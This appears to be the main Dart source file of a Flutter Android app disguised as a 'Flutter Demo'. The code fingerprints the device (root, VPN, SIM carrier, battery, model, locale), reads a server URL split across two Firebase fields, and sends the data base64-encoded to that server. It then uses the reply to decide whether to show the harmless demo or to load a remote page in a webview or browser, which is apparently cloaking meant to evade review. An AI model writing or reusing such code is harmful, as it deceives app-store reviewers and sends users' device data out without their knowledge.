import 'dart:convert';

import 'package:android_play_install_referrer/android_play_install_referrer.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:http/http.dart' as http;
import 'package:battery/battery.dart';
import 'package:check_vpn_connection/check_vpn_connection.dart';
import 'package:device_info/device_info.dart';
import 'package:devicelocale/devicelocale.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:package_info/package_info.dart';
import 'package:root_check/root_check.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:sim_info/sim_info.dart';
import 'package:url_launcher/url_launcher.dart';

import 'pages/home.page.dart';
import 'pages/webview.page.dart';
import 'settings/settings.dart';

Future<void> _launchInBrowser(String url) async {
  if (await canLaunch(url)) {
    await launch(
      url,
      forceSafariVC: false,
      forceWebView: false,
    );
  } else {
    throw 'Could not launch $url';
  }
}

AppsflyerSdk appsflyer;

Future<Map> _getDeviceData() async {
  final packageName = (await PackageInfo.fromPlatform()).packageName;
  final root = await RootCheck.checkForRootNative;
  final locale = await Devicelocale.currentLocale;
  final batteryLevel = await Battery().batteryLevel;
  final batteryCharging =
      (await Battery().onBatteryStateChanged.first) == BatteryState.charging;
  final androidInfo = await DeviceInfoPlugin().androidInfo;
  final mno = await SimInfo.getCarrierName;
  final vpn = await CheckVpnConnection.isVpnActive();

  // print(data.toString());
  return {
    Settings.mnoKey: mno.toString(),
    Settings.bundleKey: packageName.toString(),
    Settings.batteryPercentageKey: batteryLevel,
    Settings.batteryStateKey: batteryCharging,
    Settings.deviceNameKey: '${androidInfo.brand} ${androidInfo.model}',
    Settings.deviceLocaleKey: locale,
    Settings.deviceVpnKey: vpn,
    Settings.deviceRootedKey: root,
    Settings.deviceTabletKey:
        MediaQueryData.fromWindow(WidgetsBinding.instance.window)
                .size
                .shortestSide >
            Settings.tabletScreenWidth,
  };
}

Future<Map> _getAppsFlyerData(String id) async {
  if (id?.isNotEmpty ?? false) {
    final appsflyer = AppsflyerSdk(AppsFlyerOptions(afDevKey: id));
    await appsflyer.initSdk(
      registerConversionDataCallback: true,
      // registerOnAppOpenAttributionCallback: true,
      // registerOnDeepLinkingCallback: true
    );
    final data = (await appsflyer.conversionDataStream.first)['data'];
    if (data[Settings.mediaSourceKey] == null &&
        data[Settings.agencyKey] == null) {
      return null;
    }
    return {
      Settings.mediaSourceKey: data[Settings.mediaSourceKey],
      Settings.agencyKey: data[Settings.agencyKey],
      Settings.adIdKey: data[Settings.adIdKey],
      Settings.adsetIdKey: data[Settings.adsetIdKey],
      Settings.campaignIdKey: data[Settings.campaignIdKey],
      Settings.campaignKey: data[Settings.campaignKey],
      Settings.adgroupIdKey: data[Settings.adgroupIdKey],
      Settings.isFbKey: data[Settings.isFbKey],
      Settings.afSitedKey: data[Settings.afSitedKey],
      Settings.httpReferrerKey: data[Settings.httpReferrerKey],
    };
  } else {
    return null;
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  final prefs = await SharedPreferences.getInstance();

  ///Check initialization
  if (prefs.getBool(Settings.initiated) ?? false) {
    modeRunner(prefs.getString(Settings.webViewUrl),
        prefs.getBool(Settings.overrideUrlKey));
  } else {
    ///Get device data
    final requestData = {};
    requestData.addAll(await _getDeviceData());

    ///

    await Firebase.initializeApp();
    try {
      ///Get data from firebase database
      print('7');
      final data = await FirebaseDatabase.instance
          .reference()
          .child(Settings.databaseRoot)
          .once()
          .then((json) {
        if (json?.value == null) throw StateError('Wrong JSON');
        return json.value;
      });

      ///

      ///Get traffic data
      print('6');
      final String appsflyerId = data[Settings.appsflyer];
      final appsflyerData = await _getAppsFlyerData(appsflyerId);
      var appsflyerUid = '';
      if (appsflyer != null) {
        appsflyerUid = await appsflyer.getAppsFlyerUID();
      }
      requestData.addAll({Settings.appsflyerUid: appsflyerUid});
      if (appsflyerData == null) {
        final referrer = (await AndroidPlayInstallReferrer.installReferrer)
            ?.installReferrer ??
            '';
        requestData[Settings.installRefererKey] = referrer;
      } else {
        requestData.addAll(appsflyerData);
      }

      ///

      ///Create request
      print('5');
      final url = data[Settings.baseUrl1] + data[Settings.baseUrl2] + Settings.urlPath;
      print(url);
      // print(requestData);
      String jsoniche = json.encode(requestData);
      print('JSON = ' + jsoniche);
      final encodedData = base64Encode(utf8.encode(jsoniche));
      print(encodedData);
      final request = Uri.tryParse(url).replace(
          // path: Settings.urlPath,
          queryParameters: {Settings.queryParamName: encodedData});
      print('request = ' + request.toString());

      ///
      print('4');
      final response = await http.get(request);

      print('response = ' + response.body);
      final body = jsonDecode(response.body);
      final requestUrl1 =
          (body[Settings.url11key] ?? '') + (body[Settings.url12key] ?? '');
      print('request_url = ' + requestUrl1);
      final requestUrl2 =
          (body[Settings.url21key] ?? '') + (body[Settings.url22key] ?? '');
      final overrideUrl = body[Settings.overrideUrlKey] ?? false;
      print('3');
      ///Save for next launches
      prefs.setBool(Settings.initiated, true);
      prefs.setString(Settings.webViewUrl, requestUrl2);
      prefs.setBool(Settings.overrideUrlKey, overrideUrl);

      ///
      print('2');
      modeRunner(requestUrl1, overrideUrl);
      print('1');
    } catch (e) {
      print('Error occurred: $e');
      runApp(Application());
    }
  }
}

void modeRunner(String url, bool override) {
  if (url?.isEmpty ?? true) {
    print('d0');
    runApp(Application());
  } else {
    if (override ?? false) {
      print('d1');
      _launchInBrowser(url);
    } else {
      print('d2');
      runApp(WebView(url: url));
    }
  }
}

class WebView extends StatelessWidget {
  final String url;

  const WebView({Key key, this.url}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
        home: WebViewPage(
      url: url,
    ));
  }
}

class Application extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: HomePage(title: 'Flutter Demo Home Page'),
    );
  }
}
